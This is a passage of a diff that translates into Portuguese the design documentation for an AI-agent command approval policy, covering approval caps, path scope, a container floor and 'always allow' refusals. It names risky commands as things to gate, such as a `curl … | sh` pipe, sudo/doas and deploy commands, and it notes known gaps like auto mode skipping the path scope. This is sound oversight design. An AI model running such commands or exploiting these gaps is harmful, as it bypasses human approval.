-editing IT instead of the usual representative type, and "manual" on it is
-the same wildcard rewritten as `require_approval`.
+O "modo automático" exige `maintainer` — o mesmo papel que já protegia
+`PUT .../agent-autonomy` antes de a curinga existir. Desligá-lo reusa o toggle
+manual/auto que o card do agente já tinha em Visão geral/Executores: com a
+curinga gravada, o toggle passa a editar ELA em vez do tipo representativo de
+sempre, e "manual" nele é a mesma curinga regravada como `require_approval`.
 
-### The container floor ([RN-492](../business-rules/engine.md#rn-492)/[RN-493](../business-rules/api.md#rn-493), [ADR 0134](../adr/0134-dev-agents-executam-dentro-do-container.md))
+### O piso do container ([RN-492](../business-rules/engine.md#rn-492)/[RN-493](../business-rules/api.md#rn-493), [ADR 0134](../adr/0134-dev-agents-executam-dentro-do-container.md))
 
-Node `C0` in the diagram above is new: when the action is `terminal` AND the
-project has a container REGISTERED as `running` in `project_containers`
-(`execution_mode: container` — checked by `ProposeActionUseCase`, which
-already reads the same container lifecycle the execution side reads), the
-BASE value stops being `require_approval` and starts as `auto_approve`.
+O nó `C0` do diagrama acima é novo: quando a ação é `terminal` E o projeto tem
+um container REGISTRADO como `running` em `project_containers`
+(`execution_mode: container` — conferido por `ProposeActionUseCase`, que já lê
+o mesmo ciclo de vida do container que o lado da execução lê), o valor BASE
+deixa de ser `require_approval` e começa como `auto_approve`.
 
-This is a floor, not a new cap, and the distinction matters: every stage
-that follows (`agent_autonomy`, `permissions.json`) already REPLACES the
-base value when it has an explicit opinion — that's the same mechanism
-that already let a `deny` rule or an `ask` pattern override the default
-`require_approval` today. Starting from `auto_approve` instead of
-`require_approval` doesn't change that property: an explicit `deny` or a
-matching `ask` pattern still wins over the floor exactly like it already
-won over the default. And the four caps below (`S`, `Z`, `H`, and the
-compound-command rule) keep applying on top, unconditionally, whether the
-`auto_approve` came from the floor or from an explicit rule — `git push`
-inside a running container is still `require_approval`, same as always.
+Isto é um piso, não um teto novo, e a distinção importa: toda etapa seguinte
+(`agent_autonomy`, `permissions.json`) já SUBSTITUI o valor base quando tem
+opinião explícita — é o mesmo mecanismo que já deixava uma regra `deny` ou um
+padrão `ask` sobrepor o `require_approval` padrão hoje. Partir de
+`auto_approve` em vez de `require_approval` não muda essa propriedade: um
+`deny` explícito ou um padrão `ask` que casa continua vencendo o piso
+exatamente como já vencia o padrão. E os quatro tetos abaixo (`S`, `Z`, `H` e
+a regra do comando composto) continuam valendo por cima, incondicionalmente,
+venha o `auto_approve` do piso ou de uma regra explícita — `git push` dentro de
+um container em execução continua `require_approval`, como sempre.
 
-**Why this is safe: a second, stronger boundary, not the absence of one.**
-Outside a container, the LEXICAL path scope below (`comandoNoEscopo`
-against `projectScopeRoot`, a HOST path) is what makes auto-approving via
-`permissions.json allow` safe. Inside the real container, the command
-physically cannot see anything outside `/work` — Docker's mount namespace
-— and the broker independently re-validates `cwd` is inside `/work`
-before running anything (`DiretorioForaDoEscopoError`). **The lexical path
-scope still runs on top of the floor, unchanged**: `cwd`/`command` reaching
-`decide()` are never translated to `/work` (that translation happens later,
-on the engine side, right before calling the broker), so a command that
-would be flagged out-of-scope today is still flagged out-of-scope with the
-floor on — it's redundant defense-in-depth, not a replacement.
+**Por que isto é seguro: uma segunda fronteira, mais forte, não a ausência de
+uma.** Fora de um container, o escopo de caminho LÉXICO abaixo
+(`comandoNoEscopo` contra `projectScopeRoot`, um caminho do HOST) é o que torna
+seguro auto-aprovar via `permissions.json allow`. Dentro do container real, o
+comando fisicamente não enxerga nada fora de `/work` — o mount namespace do
+Docker — e o broker revalida de forma independente que o `cwd` está dentro de
+`/work` antes de rodar qualquer coisa (`DiretorioForaDoEscopoError`). **O
+escopo de caminho léxico continua rodando por cima do piso, sem mudança**:
+`cwd`/`command` que chegam a `decide()` nunca são traduzidos para `/work` (essa
+tradução acontece depois, do lado do engine, logo antes de chamar o broker),
+então um comando que hoje seria marcado fora do escopo continua marcado fora do
+escopo com o piso ligado — é defesa em profundidade redundante, não
+substituição.
 
-## The boundary of external effect and privileged command (RN-418) {#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418}
+## A fronteira de efeito externo e comando privilegiado (RN-418) {#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418}
 
-**Revision of [ADR 0065](../adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica.md)
-by [ADR 0102](../adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny.md)**
-— a GLOBAL and explicit decision by the product owner, confirmed after an
-automatic security warning about the change (the full history is in the
-ADR). What follows describes the CURRENT behavior; the previous version
-(unconditional `deny`, applied before any permissive stage) was replaced,
-not loosened — see why right below.
+**Revisão do [ADR 0065](../adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica.md)
+pelo [ADR 0102](../adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny.md)**
+— uma decisão GLOBAL e explícita do dono do produto, confirmada depois de um
+aviso automático de segurança sobre a mudança (o histórico inteiro está no
+ADR). O que segue descreve o comportamento ATUAL; a versão anterior (`deny`
+incondicional, aplicado antes de qualquer etapa permissiva) foi substituída,
+não afrouxada — veja o porquê logo abaixo.
 
-`git push`, `git remote add`/`set-url`, `git merge`, the provider CLIs
-(`gh pr create`, `gh pr merge`, `glab mr create`/`merge`, releases and
-workflow dispatch), common deploy commands (`kubectl apply`, `helm
-upgrade`, `terraform apply`, `docker push`, `npm publish`, ...) and now
-also `sudo`/`doas` in a `terminal` command are an **ABSOLUTE CAP** (and,
-since [RN-689](../business-rules/api.md#rn-689), so are the TYPED `git_push` and
-`pr_open` actions, which until then the `"*"` wildcard, a specific rule or
-`permissions.json` promoted to `auto_approve`) — in the
-same final block as the other three caps (see ["Caps"](#caps) below),
-applied after `agent_autonomy` and `permissions.json` have already given
-their opinion: if the verdict up to that point was `auto_approve`, it
-becomes unconditional `require_approval`. Neither the `"*"` wildcard for
-"automatic mode" nor an `allow` entry in `permissions.json` can promote it
-back.
+`git push`, `git remote add`/`set-url`, `git merge`, as CLIs dos providers
+(`gh pr create`, `gh pr merge`, `glab mr create`/`merge`, releases e
+workflow dispatch), comandos comuns de deploy (`kubectl apply`, `helm
+upgrade`, `terraform apply`, `docker push`, `npm publish`, ...) e agora
+também `sudo`/`doas` num comando de `terminal` são um **TETO ABSOLUTO** (e,
+desde a [RN-689](../business-rules/api.md#rn-689), também as ações TIPADAS
+`git_push` e `pr_open`, que até então a curinga `"*"`, uma regra específica ou
+o `permissions.json` promoviam a `auto_approve`) — no mesmo bloco final dos
+outros três tetos (veja ["Tetos"](#caps) abaixo), aplicado depois de
+`agent_autonomy` e `permissions.json` já terem opinado: se o veredito até ali
+era `auto_approve`, ele vira `require_approval` incondicional. Nem a curinga
+`"*"` do "modo automático" nem uma entrada `allow` no `permissions.json`
+conseguem promovê-lo de volta.
 
-**Why `require_approval` is now safe, when before it required `deny`.**
-The historical reason for the `deny` was concrete: "always allow" writes
-the pattern into `allow`, and a single click would be enough to reopen the
-door forever. That gap was closed AT THE SOURCE, not worked around:
+**Por que `require_approval` agora é seguro, quando antes exigia `deny`.** O
+motivo histórico do `deny` era concreto: "sempre permitir" grava o padrão no
+`allow`, e um único clique bastaria para reabrir a porta para sempre. Essa
+brecha foi fechada NA FONTE, não contornada:
 `ApproveAlwaysActionUseCase`/`patternsForAction`
 (`src/application/use-cases/actions/approve-always-action.use-case.ts`)
-REFUSE to write a pattern into `allow` for a terminal action with git
-external effect or a privileged command — the user still approves the
-specific instance through the normal flow, but "always allow" never writes
-the pattern for these two cases. Without this refusal, the cap would be
-decorative.
+RECUSAM gravar padrão no `allow` para ação de terminal com efeito externo de
+git ou comando privilegiado — o usuário continua aprovando a instância
+específica pelo fluxo normal, mas "sempre permitir" nunca grava o padrão nesses
+dois casos. Sem essa recusa, o teto seria decorativo.
 
-`sudo`/`doas` got their own category in `external-effect.ts`
-(`comandoPrivilegiadoNoComando`), matching by VERB in any segment — same
-principle as `efeitoExternoNoComando` for git, which continues matching by
-**token prefix**, ignoring global flags in the middle (`git -C /tmp push`
-matches `git push`). Each segment of a compound command is checked: `pnpm
-test && git push origin main` is blocked by the second segment, the same
-way a compound command already requires every segment to match to become
+`sudo`/`doas` ganharam categoria própria em `external-effect.ts`
+(`comandoPrivilegiadoNoComando`), casando pelo VERBO em qualquer segmento —
+mesmo princípio de `efeitoExternoNoComando` para git, que continua casando por
+**prefixo de token**, ignorando flags globais no meio (`git -C /tmp push` casa
+com `git push`). Cada segmento de um comando composto é conferido: `pnpm
+test && git push origin main` é barrado pelo segundo segmento, do mesmo jeito
+que um comando composto já exige que todo segmento case para virar
 `auto_approve`.
 
-The cap doesn't take power away from the agent: for git, the error message
-keeps pointing to which **typed** action to use — `git_push`, `git_merge`
-or `pr_open` — which is born a `proposed_action`, follows the normal
-pipeline, and records in the event log what was pushed and to where (it's
-the path the dev agent already uses today, `agent_io.ex`). `sudo`/`doas`
-don't have an equivalent typed action — the message just explains why that
-command requires a human decision.
+O teto não tira poder do agente: para git, a mensagem de erro continua
+apontando qual ação **tipada** usar — `git_push`, `git_merge` ou `pr_open` —,
+que nasce `proposed_action`, segue o pipeline normal e grava no event log o que
+foi enviado e para onde (é o caminho que o dev agent já usa hoje,
+`agent_io.ex`). `sudo`/`doas` não têm ação tipada equivalente — a mensagem só
+explica por que aquele comando exige decisão humana.
 
-**Where this matters most now**: the
-[local runner](../adr/0103-runner-local-execucao-na-maquina-do-usuario.md)
-executes ALREADY approved commands on the user's own machine, with their
-own privileges — it's exactly the scenario where a legitimate `sudo` (or
-an attempt to escape via `sudo`) needs a human stop guaranteed by
-construction, not by `permissions.json` convention.
+**Onde isto mais importa agora**: o
+[runner local](../adr/0103-runner-local-execucao-na-maquina-do-usuario.md)
+executa comandos JÁ aprovados na própria máquina do usuário, com os
+privilégios dele — é exatamente o cenário em que um `sudo` legítimo (ou uma
+tentativa de escapar via `sudo`) precisa de uma parada humana garantida por
+construção, não por convenção do `permissions.json`.
 
 **`container_remove` (ADR 0136, [RN-495](../business-rules/api.md#rn-495))
-joins the same "always allow" refusal**, by a simpler mechanism than the
-one above: it isn't a `terminal` command matched by token, it's its own
-`actionType`, so `ApproveAlwaysActionUseCase` refuses the click outright
-for that type — no pattern is ever written, and the user approves the
-specific instance through the normal flow instead. `container_start` and
-`container_stop` are NOT refused this way: they can be configured
-`auto_approve`, same calibre as `open_adr_pr`/`open_infra_pr` —
-`container_stop` is never seeded, and `container_start` is seeded for the
-Infra agent on its handoff accept since ADR 0190.
+entra na mesma recusa de "sempre permitir"**, por um mecanismo mais simples
+que o de cima: ele não é comando de `terminal` casado por token, é um
+`actionType` próprio, então `ApproveAlwaysActionUseCase` recusa o clique de
+saída para esse tipo — nenhum padrão é gravado, e o usuário aprova a instância
+específica pelo fluxo normal. `container_start` e `container_stop` NÃO são
+recusados assim: podem ser configurados `auto_approve`, mesmo calibre de
+`open_adr_pr`/`open_infra_pr` — `container_stop` nunca é semeado, e
+`container_start` é semeado para o agente de Infra no aceite do handoff dele
+desde o ADR 0190.
 
-**Order of an "always allow" click ([RN-642](../business-rules/api.md#rn-642)).**
-The approval and the pattern are recorded in the SAME transaction: the
-pattern (in `allow`, or in `agent_autonomy` for a module dev agent) and its
-`permission.granted` event are written only after the transition out of
-`pending` is valid, and a pattern that fails to write undoes the approval.
-The `permissions.json` is a file and cannot join the transaction — the
-residual window is the commit failing after the file was written, declared.
-Clicking an action that already left `pending` by an APPROVAL (a double
-click, the same pending action shown in two panels) is idempotent success,
-`desfecho: "ja_aprovada"`, which records the pattern only if it is missing;
-clicking a DENIED action is still `409` with `reason: "acao_ja_recusada"`
-and writes nothing. The caps above are checked before any of this, even for
-an action that was already approved.
+**Ordem de um clique em "sempre permitir" ([RN-642](../business-rules/api.md#rn-642)).**
+A aprovação e o padrão são gravados na MESMA transação: o padrão (no `allow`,
+ou no `agent_autonomy` para um dev agent de módulo) e o evento
+`permission.granted` dele só são escritos depois de a transição para fora de
+`pending` ser válida, e um padrão que falha ao gravar desfaz a aprovação. O
+`permissions.json` é arquivo e não entra na transação — a janela residual é o
+commit falhar depois de o arquivo ter sido escrito, declarada. Clicar numa ação
+que já saiu de `pending` por uma APROVAÇÃO (um duplo clique, a mesma ação
+pendente mostrada em dois painéis) é sucesso idempotente,
+`desfecho: "ja_aprovada"`, que grava o padrão só se ele falta; clicar numa ação
+NEGADA continua `409` com `reason: "acao_ja_recusada"` e não grava nada. Os
+tetos acima são conferidos antes de tudo isso, mesmo para uma ação que já foi
+aprovada.
 
-**The TYPED half of the cap (AT-320).** Until 30/09 only the typed-in
-`git push` command was refused; a typed `git_push` action went through and
-wrote `GitPush()` into `allow`. "Always allow" now refuses, by type, the
-single list `TIPOS_SEM_SEMPRE_PERMITIR`
+**A metade TIPADA do teto (AT-320).** Até 30/09 só o comando digitado
+`git push` era recusado; uma ação tipada `git_push` passava e gravava
+`GitPush()` no `allow`. "Sempre permitir" agora recusa, por tipo, a lista
+única `TIPOS_SEM_SEMPRE_PERMITIR`
 (`src/domain/actions/sempre-permitir.ts`): `git_push`, `pr_open`,
-`git_merge`, `container_remove`, `instruction_patch`, `parallelize` and
-`raise_max_parallel` — `400` with `reason: "teto_do_sempre_permitir"`. The
-approval card hides the button for the same list (a copy checked against
-this one by test). When it shipped, this did NOT change `decide()` nor what
-activating execution seeds; since [RN-689](../business-rules/api.md#rn-689) both
-changed: `git_push` and `pr_open` are inside the RN-418 cap in `decide()`
-(see ["Caps"](#caps)), and activating execution seeds only `git_commit` as
-`auto_approve` for each `dev-<module>`.
+`git_merge`, `container_remove`, `instruction_patch`, `parallelize` e
+`raise_max_parallel` — `400` com `reason: "teto_do_sempre_permitir"`. O card
+de aprovação esconde o botão para a mesma lista (uma cópia conferida contra
+esta por teste). Quando entrou, isto NÃO mudou `decide()` nem o que a ativação
+da execução semeia; desde a [RN-689](../business-rules/api.md#rn-689) os dois
+mudaram: `git_push` e `pr_open` estão dentro do teto da RN-418 em `decide()`
+(veja ["Tetos"](#caps)), e ativar a execução semeia só `git_commit` como
+`auto_approve` para cada `dev-<modulo>`.
 
-**The unit of the recorded pattern: verb + subcommand, one per segment
-([RN-675](../business-rules/api.md#rn-675), owner decision 01/10).** "Always
-allow" no longer records the whole command byte by byte: each segment of
-the command (split on `&&`, `||`, `;`, `|`, `&`, as `decide()` splits it)
-becomes one pattern — the verb plus its subcommand when the second token is
-a word (`npm test`, `git status`, `mix test`, `npx vitest`), the verb alone
-when it is an argument that is not a word (`cat src/x.ts` → `Terminal(cat)`,
-`cd ../lib` → `Terminal(cd)`), and the EXACT segment when the second token is
-a flag (`ls -la src`) or when the unit would be a prefix of an RN-418 cap
-(`git remote -v`, `gh pr list` stay exact). A segment that is a cap prefix
-even when exact (`git` alone) records nothing. `cd src/app && npm test`
-records `Terminal(cd)` and `Terminal(npm test)`, and the next
-`cd lib/core && npm test -- --coverage` runs without asking. Matching is
-still by token prefix, the caps still run after the file in `decide()`, and
-the path scope still applies outside auto mode. A module dev agent's click
-still goes to `agent_autonomy`, not to a pattern ([RN-509](../business-rules/api.md#rn-509)).
+**A unidade do padrão gravado: verbo + subcomando, um por segmento
+([RN-675](../business-rules/api.md#rn-675), decisão do dono de 01/10).** "Sempre
+permitir" não grava mais o comando inteiro byte a byte: cada segmento do
+comando (dividido em `&&`, `||`, `;`, `|`, `&`, como `decide()` o divide) vira
+um padrão — o verbo mais o subcomando quando o segundo token é uma palavra
+(`npm test`, `git status`, `mix test`, `npx vitest`), o verbo sozinho quando é
+um argumento que não é palavra (`cat src/x.ts` → `Terminal(cat)`,
+`cd ../lib` → `Terminal(cd)`), e o segmento EXATO quando o segundo token é uma
+flag (`ls -la src`) ou quando a unidade seria prefixo de um teto da RN-418
+(`git remote -v`, `gh pr list` ficam exatos). Um segmento que é prefixo de teto
+mesmo exato (`git` sozinho) não grava nada. `cd src/app && npm test` grava
+`Terminal(cd)` e `Terminal(npm test)`, e o próximo
+`cd lib/core && npm test -- --coverage` roda sem perguntar. O casamento
+continua por prefixo de token, os tetos continuam rodando depois do arquivo em
+`decide()`, e o escopo de caminho continua valendo fora do modo automático. O
+clique de um dev agent de módulo continua indo para o `agent_autonomy`, não
+para um padrão ([RN-509](../business-rules/api.md#rn-509)).
 
-## Path scope {#path-scope}
+## Escopo de caminho {#path-scope}
 
-A `terminal` command is also evaluated by **where it touches**, not just
-by the verb ([ADR 0055](../adr/0055-escopo-de-caminho-na-politica-de-terminal.md),
-[RN-075](../business-rules/api.md#rn-075)). The project folder —
-`<PROJECT_WORKSPACES_ROOT>/<workspace_dir_name>`, where `permissions.json`
-and all agent worktrees live — is the **scope**. `workspace_dir_name`
+Um comando de `terminal` é avaliado também por **onde ele toca**, não só pelo
+verbo ([ADR 0055](../adr/0055-escopo-de-caminho-na-politica-de-terminal.md),
+[RN-075](../business-rules/api.md#rn-075)). A pasta do projeto —
+`<PROJECT_WORKSPACES_ROOT>/<workspace_dir_name>`, onde moram o
+`permissions.json` e todos os worktrees dos agentes — é o **escopo**.
+`workspace_dir_name`
 ([ADR 0066](../adr/0066-nome-de-pasta-legivel-do-workspace.md),
-[RN-109](../business-rules/api.md#rn-109)) is the folder name frozen at
-project creation — readable (`<slug>-<8 chars of the id>`) in a new
-project, the plain UUID in a project from before that change.
+[RN-109](../business-rules/api.md#rn-109)) é o nome da pasta
+congelado na criação do projeto — legível (`<slug>-<8 caracteres do id>`) num
+projeto novo, o UUID puro num projeto de antes dessa mudança.
 
-**A project in `local` mode has a different scope, and the difference
-matters here** ([ADR 0072](../adr/0072-projeto-local-ou-container.md),
+**Um projeto em modo `local` tem um escopo diferente, e a diferença importa
+aqui** ([ADR 0072](../adr/0072-projeto-local-ou-container.md),
 [RN-169](../business-rules/api.md#rn-169)/[RN-170](../business-rules/api.md#rn-170)):
-the root becomes the **absolute path the user typed at creation**, not
+a raiz passa a ser o **caminho absoluto que o usuário digitou na criação**, não
 `join(PROJECT_WORKSPACES_ROOT, workspace_dir_name)`.
 
-Everything this section describes still holds — the scope tightens and
-loosens exactly the same way, and `deny` still wins first. What changes is
-what it CONTAINS. And the consequence is declared without softening in ADR
-0072: the **structural** containment of the `join` — "the result never
-leaves the managed root, whatever happens to the column" — ceases to exist
-for these projects. What replaces it is the creation-time validation
-(RN-170: absolute, no `..`, existing, writable, never a system root, never
-overlapping the Brabo checkout), plus the LEXICAL revalidation of the same
-predicate on every derivation of the root — so that a row tampered with
-directly in the database doesn't turn into a terminal scope at `/`.
+Tudo o que esta seção descreve continua valendo — o escopo aperta e afrouxa
+exatamente do mesmo jeito, e `deny` continua vencendo primeiro. O que muda é o
+que ele CONTÉM. E a consequência é declarada sem atenuação no ADR 0072: a
+contenção **estrutural** do `join` — "o resultado nunca sai da raiz gerenciada,
+aconteça o que acontecer com a coluna" — deixa de existir para esses projetos.
+O que a substitui é a validação na criação (RN-170: absoluto, sem `..`,
+existente, gravável, nunca uma raiz de sistema, nunca sobreposto ao checkout do
+Brabo), mais a revalidação LÉXICA do mesmo predicado em toda derivação da raiz
+— para que uma linha adulterada direto no banco não vire um escopo de terminal
+em `/`.
 
-Path comparison is **lexical and without regex over the input**: trimming
-trailing slashes is an O(n) scan, not `.replace(/\/+$/, '')`. The old
-pattern was flagged by CodeQL as polynomial ReDoS (HIGH) — it forces the
-engine to try every starting position, and degrades to O(n²) with many
-slashes. The input here comes from an agent command, so it's not a place
-for backtracking regex.
+A comparação de caminho é **léxica e sem regex sobre a entrada**: aparar barras
+finais é uma varredura O(n), não `.replace(/\/+$/, '')`. O padrão antigo foi
+apontado pelo CodeQL como ReDoS polinomial (HIGH) — ele força o motor a tentar
+toda posição inicial, e degrada para O(n²) com muitas barras. A entrada aqui
+vem de um comando de agente, então não é lugar para regex com backtracking.
 
-The scope does two opposite things, and it's the combination that matters:
+O escopo faz duas coisas opostas, e é a combinação que importa:
 
-**Tightens.** A command that touches a path from outside is never
-auto-approved, no matter how much the verb is in `allow`. Without this, an
-allowed `Terminal(cat)` would auto-execute `cat
-/workspace/apps/engine/lib/engine/actions/git_executor.ex` — the platform
-code that runs the agent — and reach into other projects' worktrees.
+**Aperta.** Um comando que toca um caminho de fora nunca é auto-aprovado, por
+mais que o verbo esteja no `allow`. Sem isso, um `Terminal(cat)` permitido
+auto-executaria `cat
+/workspace/apps/engine/lib/engine/actions/git_executor.ex` — o código da
+plataforma que roda o agente — e alcançaria os worktrees de outros projetos.
 
-**Loosens.** Within the scope, `cd` stops being a verb that needs
-permission: it's the scope declaration itself. Without this, the dev
-agent, which always emits `cd <caminho> && <verbo>`, would run into the
-compound-command rule — every segment needs to match — and **every**
-command would stop for approval, no matter how much the verb was allowed.
+**Afrouxa.** Dentro do escopo, `cd` deixa de ser verbo que precisa de
+permissão: ele é a própria declaração do escopo. Sem isso, o dev agent, que
+sempre emite `cd <caminho> && <verbo>`, esbarraria na regra do comando
+composto — todo segmento precisa casar — e **todo** comando pararia para
+aprovação, por mais que o verbo estivesse permitido.
 
-Four limits worth understanding:
+Quatro limites que vale entender:
 
-- **Scope permits, it doesn't exempt.** Being in the project folder
-  doesn't make `curl … | sh` safe: a verb outside `allow` still requires
-  approval.
-- **Outside the scope is `require_approval`, not `deny`.** The agent may
-  have a legitimate reason to look outside; who decides remains you.
-- **Auto mode skips this cap.** An agent with the `"*": auto_approve`
-  wildcard runs commands outside the scope without asking
-  ([RN-603](../business-rules/api.md#rn-603)); turning the agent
-  card back to "manual" restores it.
-- **Normalization is lexical, not `realpath`.** `<raiz>/../..` is resolved
-  and rejected; a symbolic link inside the project pointing outward is
-  **not** detected. Scope is policy, not isolation.
+- **Escopo permite, não isenta.** Estar na pasta do projeto não torna
+  `curl … | sh` seguro: um verbo fora do `allow` continua exigindo aprovação.
+- **Fora do escopo é `require_approval`, não `deny`.** O agente pode ter um
+  motivo legítimo para olhar fora; quem decide continua sendo você.
+- **O modo automático pula este teto.** Um agente com a curinga
+  `"*": auto_approve` roda comandos fora do escopo sem perguntar
+  ([RN-603](../business-rules/api.md#rn-603)); voltar o card do
+  agente para "manual" o restaura.
+- **A normalização é léxica, não `realpath`.** `<raiz>/../..` é resolvido e
+  rejeitado; um link simbólico dentro do projeto apontando para fora **não** é
+  detectado. Escopo é política, não isolamento.
 
-Which tokens are checked: **absolute** ones (start with `/`) and ones that
-contain `..`. A relative one without `..` resolves under the `cwd`, which
-was already checked — and treating `-maxdepth`, `4`, or `*.ex` as a path
-would reject a legitimate command without gaining any security.
+Quais tokens são conferidos: os **absolutos** (começam com `/`) e os que
+contêm `..`. Um relativo sem `..` resolve abaixo do `cwd`, que já foi conferido
+— e tratar `-maxdepth`, `4` ou `*.ex` como caminho rejeitaria um comando
+legítimo sem ganhar segurança nenhuma.
 
-Two properties that fall out of this:
+Duas propriedades que decorrem disto:
 
-**`deny` wins immediately.** No matter what stage it appears in, it
-returns right away. There's no configuration that reverts a `deny`.
+**`deny` vence na hora.** Não importa em que etapa apareça, ele devolve na
+hora. Não há configuração que reverta um `deny`.
 
-**A silent stage never downgrades.** If `agent_autonomy` said
-`auto_approve` and `permissions.json` has no rule for that action, the
-result stays `auto_approve` — the file doesn't "vote against" by
-omission. Each stage can only raise the permissiveness of the previous
-one.
+**Etapa calada nunca rebaixa.** Se o `agent_autonomy` disse `auto_approve` e o
+`permissions.json` não tem regra para aquela ação, o resultado continua
+`auto_approve` — o arquivo não "vota contra" por omissão. Cada etapa só pode
+subir a permissividade da anterior.
 
-## Caps {#caps}
+## Tetos {#caps}
 
-Applied **last**, after everything else:
+Aplicados **por último**, depois de todo o resto:
 
-| cap | effect | why |
+| teto | efeito | por quê |
 |---|---|---|
-| `git_merge` with destination in `dev`, `qa`, `rc` or `main` | `auto_approve` → `require_approval` | merge into a protected branch is always your decision ([RN-006](../business-rules/api.md#rn-006)) |
-| `instruction_patch` | `auto_approve` → `require_approval` | you need to see the diff before one agent changes another's behavior ([RN-007](../business-rules/api.md#rn-007)) |
-| `parallelize` and `raise_max_parallel` | `auto_approve` → `require_approval` | spending on more agents is your decision; without this cap the lead's limit would be decorative, and raising the cap itself would be the product raising its own spending limit ([RN-086](../business-rules/api.md#rn-086)) |
-| `terminal` with external-effect git (push/PR/deploy) or `sudo`/`doas` | `auto_approve` → `require_approval` | external-effect git and privileged commands are never auto-approvable, even with "automatic mode" on ([RN-418](../business-rules/api.md#rn-418), revises [RN-106](../business-rules/api.md#rn-106)) — see the dedicated section above |
-| typed `git_push` and `pr_open` | `auto_approve` → `require_approval` | the same RN-418 cap through the typed door: neither the auto-mode wildcard, nor a specific `agent_autonomy` rule, nor `permissions.json` promotes them ([RN-689](../business-rules/api.md#rn-689)). `git_merge` keeps its own cap (first row); `deploy` is not a `proposed_action` type |
-| `container_remove` | `auto_approve` → `require_approval` | discarding a container forces a full reprovision — the same caliber as merging into a protected branch, decided every time, never configured once ([RN-495](../business-rules/api.md#rn-495)) |
+| `git_merge` com destino em `dev`, `qa`, `rc` ou `main` | `auto_approve` → `require_approval` | merge em branch protegida é sempre decisão sua ([RN-006](../business-rules/api.md#rn-006)) |
+| `instruction_patch` | `auto_approve` → `require_approval` | você precisa ver o diff antes de um agente mudar o comportamento de outro ([RN-007](../business-rules/api.md#rn-007)) |
+| `parallelize` e `raise_max_parallel` | `auto_approve` → `require_approval` | gastar com mais agentes é decisão sua; sem este teto o limite do lead seria decorativo, e subir o próprio teto seria o produto subindo o próprio limite de gasto ([RN-086](../business-rules/api.md#rn-086)) |
+| `terminal` com git de efeito externo (push/PR/deploy) ou `sudo`/`doas` | `auto_approve` → `require_approval` | git com efeito externo e comandos privilegiados nunca são auto-aprováveis, nem com o "modo automático" ligado ([RN-418](../business-rules/api.md#rn-418), revisa a [RN-106](../business-rules/api.md#rn-106)) — veja a seção dedicada acima |
+| `git_push` e `pr_open` tipados | `auto_approve` → `require_approval` | o mesmo teto da RN-418 pela porta tipada: nem a curinga do modo automático, nem uma regra específica de `agent_autonomy`, nem o `permissions.json` os promovem ([RN-689](../business-rules/api.md#rn-689)). `git_merge` mantém o teto próprio (primeira linha); `deploy` não é tipo de `proposed_action` |
+| `container_remove` | `auto_approve` → `require_approval` | descartar um container força um reprovisionamento completo — mesmo calibre de mergear em branch protegida, decidido toda vez, nunca configurado uma vez ([RN-495](../business-rules/api.md#rn-495)) |
 
-A cap downgrades `auto_approve` to `require_approval`; it does **not**
-turn `deny` into something else, because `deny` would have already
-returned earlier.
+Um teto rebaixa `auto_approve` para `require_approval`; ele **não** transforma
+`deny` em outra coisa, porque o `deny` já teria devolvido antes.
 
-:::note Why `rc` is still on the list
+:::note Por que `rc` continua na lista
 
-The `rc` rung left the branch policy
-([ADR 0030](../adr/0030-politica-de-branches-mecanizada.md)) and the
-bootstrap stopped creating it ([RN-029](../business-rules/api.md#rn-029)) —
-but it's still here, in `domain/actions/protected-branches.ts`.
+O degrau `rc` saiu da política de branches
+([ADR 0030](../adr/0030-politica-de-branches-mecanizada.md)) e o bootstrap
+parou de criá-lo ([RN-029](../business-rules/api.md#rn-029)) — mas ele continua
+aqui, em `domain/actions/protected-branches.ts`.
 
-This list decides what the merge lock **refuses**, and repositories
-bootstrapped by earlier versions of Brabo still have the branch. Removing
-it from here wouldn't remove anything from anyone's repository: it would
-only make a `git_merge` with destination `rc` auto-approvable, on a branch
-someone might be using as production.
+Esta lista decide o que a trava de merge **recusa**, e repositórios
+bootstrapados por versões anteriores do Brabo ainda têm a branch. Tirá-la daqui
+não tiraria nada do repositório de ninguém: só tornaria auto-aprovável um
+`git_merge` com destino `rc`, numa branch que alguém pode estar usando como
+produção.
 
-Protecting a branch that doesn't exist costs nothing. Unprotecting one
-that exists costs dearly — and the asymmetry is deliberate.
+Proteger uma branch que não existe não custa nada. Desproteger uma que existe
+custa caro — e a assimetria é deliberada.
 
 :::
 
-The difference between a cap and a default: the default is what happens
-when nobody configured anything; the cap is what happens **regardless** of
-what was configured.
+A diferença entre teto e padrão: o padrão é o que acontece quando ninguém
+configurou nada; o teto é o que acontece **independentemente** do que foi
+configurado.
 
-## What happens to the agent while the decision doesn't come
+## O que acontece com o agente enquanto a decisão não vem
 
-A `pending` action isn't just a row waiting for a click: on the other side
-there's an agent stopped.
+Uma ação `pending` não é só uma linha esperando um clique: do outro lado há um
+agente parado.
 
-When the tool it called becomes pending, its loop **suspends**, holding on
-to the task, the worktree, and the conversation history, and it enters
-`awaiting_approval`. Your decision emits `task.action_settled`, which
-wakes it up: the real result of the command takes the place where the
-response would be, and the loop resumes from where it stopped.
+Quando a ferramenta que ele chamou fica pendente, o laço dele **suspende**,
+segurando a tarefa, o worktree e o histórico da conversa, e ele entra em
+`awaiting_approval`. A sua decisão emite `task.action_settled`, que o acorda:
+o resultado real do comando ocupa o lugar onde estaria a resposta, e o laço
+retoma de onde parou.
 
-**Refusing also responds.** The reason takes the place of the result, and
-the agent learns that path is closed instead of waiting forever — denying
-doesn't leave it stuck.
+**Recusar também responde.** O motivo ocupa o lugar do resultado, e o agente
+aprende que aquele caminho está fechado em vez de esperar para sempre — negar
+não o deixa travado.
 
-This matters for whoever operates: approving late doesn't waste the work
-already done, and the approval queue isn't asynchronous for convenience —
-it's literally what the agent is waiting for. Before this, `pending` came
-back as if it were the command's response, and the agent burned its
-iteration cap trying something else until the task died without a single
-line written ([RN-073](../business-rules/engine.md#rn-073)).
+Isso importa para quem opera: aprovar tarde não desperdiça o trabalho já
+feito, e a fila de aprovação não é assíncrona por conveniência — ela é
+literalmente o que o agente está esperando. Antes disso, `pending` voltava
+como se fosse a resposta do comando, e o agente queimava o teto de iterações
+tentando outra coisa até a tarefa morrer sem uma linha escrita
+([RN-073](../business-rules/engine.md#rn-073)).
 
-**With one exception: engine restart.** The suspended loop lives in
